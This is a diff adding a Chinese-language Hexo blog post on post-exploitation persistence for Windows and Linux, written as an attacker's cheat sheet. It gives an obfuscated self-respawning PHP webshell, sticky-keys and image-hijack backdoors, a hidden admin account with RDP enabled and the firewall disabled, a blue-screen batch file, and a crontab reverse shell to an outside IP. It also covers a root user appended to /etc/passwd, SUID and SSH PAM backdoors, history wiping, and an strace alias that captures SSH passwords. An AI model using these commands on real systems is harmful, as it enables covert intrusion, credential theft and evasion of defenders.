@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="John Doe">
+
+
+
+
+
+<title>权限维持 | Hexo</title>
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#de7441",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#de7441",
+      "border-left-color": "#de7441",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      isDark = !isDark;
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+    $("#toggle-dark").click(toggleDark);
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200">
+  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="Hexo" />
+          Hexo
+        </h2>
+      </a>
+      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
+        权限维持
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+          <a class="hidden sm:flex" href="/archives">Posts</a>
+        
+        
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/xbmlz">
+              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
+            </a>
+          
+        
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
+        </span>
+        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
+          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
+  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
+          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
+        </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="p-12">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+
+
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+
+  <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+
+
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
+        权限维持
+      </h1>
+      <p class="mb-6">
+        
+      </p>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <time>2023-09-19 16:53:24</time>
+          <span class="text-gray-400">·</span>
+          <span>8 min</span>
+          <span class="text-gray-400">·</span>
+          <span>1.9k words</span>
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content mt-10 prose dark:prose-invert post-content">
+    <h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="php不死马"><a href="#php不死马" class="headerlink" title="php不死马"></a>php不死马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  set_time_limit(0);</span><br><span class="line">  ignore_user_abort(1);</span><br><span class="line">  unlink(__FILE__);</span><br><span class="line">  $filename = &#x27;.shell.php&#x27;;</span><br><span class="line">while(1)&#123;</span><br><span class="line">    $content = ` &lt;?php $Qqap=create_function(base64_decode(&#x27;JA==&#x27;).chr(0x3a3-0x330).chr(0152345/0753).str_rot13(&#x27;z&#x27;).str_rot13(&#x27;r&#x27;),chr(98475/975).str_rot13(&#x27;i&#x27;).base64_decode(&#x27;YQ==&#x27;).chr(0x1e7-0x17b).chr(024620/0412).str_rot13(&#x27;$&#x27;).chr(01545-01362).base64_decode(&#x27;bw==&#x27;).base64_decode(&#x27;bQ==&#x27;).base64_decode(&#x27;ZQ==&#x27;).base64_decode(&#x27;KQ==&#x27;).chr(0116270/01250));$Qqap(base64_decode(&#x27;NzM2M&#x27;.&#x27;Tk2O0&#x27;.&#x27;BldkF&#x27;.&#x27;sKCRf&#x27;.&#x27;&#x27;.chr(0x1b7-0x162).chr(0707-0602).str_rot13(&#x27;9&#x27;).chr(74088/882).chr(01716-01570).&#x27;&#x27;.&#x27;&#x27;.str_rot13(&#x27;S&#x27;).chr(0x5f9c/0xd3).str_rot13(&#x27;w&#x27;).chr(87024/888).chr(0xe8cb/0x2ad).&#x27;&#x27;.&#x27;RdKTs&#x27;.&#x27;yMjA4&#x27;.&#x27;NTg4O&#x27;.&#x27;w==&#x27;.&#x27;&#x27;));?&gt;`;</span><br><span class="line">  file_put_contents(&quot;.shell.php&quot;, $content);</span><br><span class="line">  @eval(system(&quot;Attrib +s +a +h +r .shell.php&quot;));</span><br><span class="line">  usleep(1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h4><ul>
+<li>move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bak</li>
+<li>Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe</li>
+</ul>
+<ol>
+<li>   将sethc.exe的拥有者改为administrator</li>
+<li>   运行上面的话即可</li>
+<li>   按下五次shift即可调出cmd</li>
+</ol>
+<h4 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h4><p>Attrib +s +a +h +r 1.php 隐藏文件或者目录</p>
+<h4 id="添加用户开启3389端口"><a href="#添加用户开启3389端口" class="headerlink" title="添加用户开启3389端口"></a>添加用户开启3389端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net user qianxin$ QanXin.Nb123 /add</span><br><span class="line">net localgroup administrators qianxin$ /add</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">netstat -anop tcp | find &quot;3389&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h4><ol>
+<li>   打开注册表计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ </li>
+<li>   新建一个项00.exe ，右侧新增一个字符串，名字是Debugger</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/huangxia-boke/img1/main/img/202309191653602.png" alt="image-20230918203534037"></p>
+<ol>
+<li>   值为要执行的程序C:\Windows\System32\cmd.exe(必须是这个这个斜杠)</li>
+<li>   这个效果就是只要执行任意一个叫做00.exe的程序(常用sethc.exe粘滞键)，就会运行cmd.exe</li>
+<li>   一般可以是cmd，木马等</li>
+</ol>
+<h4 id="一键蓝屏"><a href="#一键蓝屏" class="headerlink" title="一键蓝屏"></a>一键蓝屏</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">taskkill /F /T /IM wininit.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="开机自启动目录"><a href="#开机自启动目录" class="headerlink" title="开机自启动目录"></a>开机自启动目录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<h4 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h4><p>通常在拿到服务器后会创建一个带$符号的账户，因为在常规cmd下是无法查看到的。</p>
+<ol>
+<li>建立新的用户</li>
+</ol>
+<p><code>net user qianxin$ QanXin.Nb123 /add &amp; net localgroup administrators qianxin$ /add </code><br>2. 注册表打开HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User到SAM没有子目录，说明没有权限，赋权，重新打开注册表即可<br><img src="https://raw.githubusercontent.com/huangxia-boke/img1/main/img/202309191653713.png" alt="image-20230919164018021"><br>3. 将1F4下F项的值复制到3E8下F项里面，替换原有数据双击F项，右键全选，右键复制，同流程覆盖</p>
+<p><img src="https://raw.githubusercontent.com/huangxia-boke/img1/main/img/202309191652844.png" alt="image-20230919164323468"></p>
+<ol start="4">
+<li>把3E8和qianxin$导出来</li>
+<li>net user qianxin$ &#x2F;del</li>
+<li>   双击导出来的两个注册表进行导入</li>
+<li>   REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f开3389</li>
+<li>   RDP连接成功</li>
+</ol>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="crontab计划任务弹shell"><a href="#crontab计划任务弹shell" class="headerlink" title="crontab计划任务弹shell"></a>crontab计划任务弹shell</h4><ol>
+<li>   crontab默认是开的<br>crontab -l &#x2F;&#x2F;列出任务<br>crontab -e &#x2F;&#x2F;编辑任务</li>
+<li>   crontab -e* * * * * &#x2F;bin&#x2F;bash -c ‘&#x2F;bin&#x2F;sh -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.1.135&#x2F;4444 0&gt;&amp;1’;\r%100c\n计划任务反弹shell</li>
+</ol>
+<h4 id="文件属性修改"><a href="#文件属性修改" class="headerlink" title="文件属性修改"></a>文件属性修改</h4><h5 id="文件时间修改"><a href="#文件时间修改" class="headerlink" title="文件时间修改"></a>文件时间修改</h5><p>touch -r 旧文件 新文件 使新文件的时间和旧文件时间相同</p>
+<h5 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h5><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -al是查看不出来的，从而达到隐藏权限的目的。需要root权限<br>chattr +i evil.php #锁定文件<br>rm -rf evil.php #提示禁止删除<br>lsattr evil.php #属性查看<br>chattr -i evil.php #解除锁定<br>rm -rf evil.php #彻底删除文件</p>
+<h4 id="历史命令操作"><a href="#历史命令操作" class="headerlink" title="历史命令操作"></a>历史命令操作</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p>
+<h5 id="只针对你的工作关闭历史记录"><a href="#只针对你的工作关闭历史记录" class="headerlink" title="只针对你的工作关闭历史记录"></a>只针对你的工作关闭历史记录</h5><p>空格set +o history &#x2F;&#x2F;#备注：并且由于空格的缘故，该命令本身也不会被记录<br>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。<br>要重新开启历史功能，执行下面的命令：<br>空格set -o history &#x2F;&#x2F; 恢复原状</p>
+<h5 id="从历史记录中删除指定的命令"><a href="#从历史记录中删除指定的命令" class="headerlink" title="从历史记录中删除指定的命令"></a>从历史记录中删除指定的命令</h5><p>history | grep “keyword”<br>history -d [num]<br>删除大规模历史操作记录，这里，我们只保留前150行：<br>sed -i ‘150,$d’ ~&#x2F;.bash_history</p>
+<h4 id="passwd增加用户"><a href="#passwd增加用户" class="headerlink" title="passwd增加用户"></a>passwd增加用户</h4><p>&#x2F;etc&#x2F;passwd<br>用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL<br>&#x2F;etc&#x2F;shadow<br>&#x2F;etc&#x2F;shadow 各部分含义：<br>用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用</p>
+<ol>
+<li>   增加超级用户<br>perl -le ‘print crypt(“passwd”,”salt”)’ &#x2F;&#x2F;结果sadtCr0CILzv2<br>echo “m123:sadtCr0CILzv2:0:0:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt; &#x2F;etc&#x2F;passwd</li>
+</ol>
+<h4 id="suid后门"><a href="#suid后门" class="headerlink" title="suid后门"></a>suid后门</h4><p>当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件：<br>SUID权限仅对二进制程序有效。<br>执行者对于该程序需要具有x的可执行权限<br>本权限仅在执行该程序的过程中有效<br>在执行过程中执行者将具有该程序拥有者的权限<br>创建suid权限的文件：<br>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;.woot<br>chmod 4755 &#x2F;tmp&#x2F;.woot<br>ls -al &#x2F;tmp&#x2F;.woot<br>-rwsr-xr-x 1 root root 690668 Jul 24 17:14 .woot<br>使用文件获得root权限<br>&#x2F;tmp&#x2F;.woot<br>&#x2F;tmp&#x2F;.woot -p &#x2F;&#x2F;bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell<a target="_blank" rel="noopener" href="https://blog.csdn.net/fatshaw/article/details/6171035">https://blog.csdn.net/fatshaw/article/details/6171035</a><br>检查:查找具有suid权限的文件即可<br>find &#x2F; -perm +4000 -ls<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<h4 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h4><h5 id="ssh软链接后门"><a href="#ssh软链接后门" class="headerlink" title="ssh软链接后门"></a>ssh软链接后门</h5><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测uid 0 即可认证成功，这样就导致了可以使用任意密码登录:<br>ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;usr&#x2F;local&#x2F;su;&#x2F;usr&#x2F;local&#x2F;su -oPort&#x3D;12345<br>ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#x31;&#52;&#56;">&#x72;&#111;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#x31;&#52;&#56;</a> -p12345<br><a target="_blank" rel="noopener" href="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/">http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/</a><br>优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。</p>
+<h5 id="ssh公钥免密登录"><a href="#ssh公钥免密登录" class="headerlink" title="ssh公钥免密登录"></a>ssh公钥免密登录</h5><p>ssh-keygen -t rsa &#x2F;&#x2F;生成公钥<br>cat id_rsa.pub &gt; authorized_keys &#x2F;&#x2F;将id_rsa.pub内容放到目标.ssh&#x2F;authorized_keys里<br>这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。<br>chmod 600 id_rsa<br>ssh -i id_rsa <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#46;&#49;&#x34;&#56;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#46;&#49;&#x34;&#56;</a></p>
+<h5 id="ssh-Keylogger记录密码"><a href="#ssh-Keylogger记录密码" class="headerlink" title="ssh Keylogger记录密码"></a>ssh Keylogger记录密码</h5><p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。<br>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码<br>vim ~&#x2F;.bashrc<br>添加alias ssh&#x3D;’strace -o &#x2F;tmp&#x2F;.sshpwd-<code>date &#39;+%d%h%m%s&#39;</code>.log -e read,write,connect -s2048 ssh’<br>source .bashrc &#x2F;&#x2F;刷新环境变量<br>grep -A 9 ‘password’ &#x2F;tmp&#x2F;.sshpwd-1211月111668255299.log 查看ssh登录密码</p>
+<p><img src="https://raw.githubusercontent.com/huangxia-boke/img1/main/img/202309191652746.png" alt="image-20230919165233612"></p>
+
+  </article>
+  <!-- tag -->
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a>
+        </span>
+      
+    
+  </div>
+  <!-- prev and next -->
+  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
+    <div>
+      
+        <a href="/2023/09/19/%E6%89%93%E9%9D%B6hard-socnet2/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
+          打靶hard_socnet2
+        </a>
+      
+    </div>
+    <div>
+      
+        <a href="/2023/09/16/%E6%89%93%E9%9D%B6Admx/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          打靶Admx
+          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
+        </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+    
+
+  </div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+
+
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "default",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+
+
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+
+<!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
+  <!-- busuanzi -->
+  
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Busuanzi Analytics -->
+<div class="flex items-center gap-2">
+  <span>Visitor Count</span>
+  <span id="busuanzi_value_site_uv"></span>
+  <span>Totalview</span>
+  <span id="busuanzi_value_site_pv"></span>
+</div>
+<!-- End Busuanzi Analytics -->
+
+
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <span>© 2022</span>
+    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
+    <a href="https://github.com/xbmlz" target="_blank" rel="noopener noreferrer">xbmlz</a>
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+    <span>&</span>
+    <a href="https://github.com/xbmlz/hexo-theme-maple" target="_blank" rel="noopener noreferrer">Maple</a>
+  </div>
+
+</footer>
+
+  <iconify-icon class="fixed right-4 bottom-10 z-100 opacity-0" width="24" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+  
+<script src="/js/main.js"></script>
+
+
+  <script>
+    $(document).ready(function () {
+      const mapleCount = "10";
+      const speed = "0.5";
+      const mapleEl = document.getElementById("maple");
+      const maples = Array.from({ length: mapleCount }).map(() => {
+        const maple = document.createElement("div");
+        const scale = Math.random() * 0.5 + 0.5;
+        const offset = Math.random() * 2 - 1;
+        const x = Math.random() * mapleEl.clientWidth;
+        const y = -Math.random() * mapleEl.clientHeight;
+        const duration = 10 / speed;
+        const delay = -duration;
+        maple.className = "maple";
+        maple.style.width = `${24 * scale}px`;
+        maple.style.height = `${24 * scale}px`;
+        maple.style.left = `${x}px`;
+        maple.style.top = `${y}px`;
+        maple.style.setProperty("--maple-fall-offset", offset);
+        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
+        maple.style.animation = `fall ${duration}s linear infinite`;
+        maple.style.animationDelay = `${delay}s`;
+        mapleEl.appendChild(maple)
+        return maple
+      })
+    });
+  </script>
+  
+
+
+  <div class="w-screen h-screen -z-999" id="maple"></div>
+</body>
+
+</html>
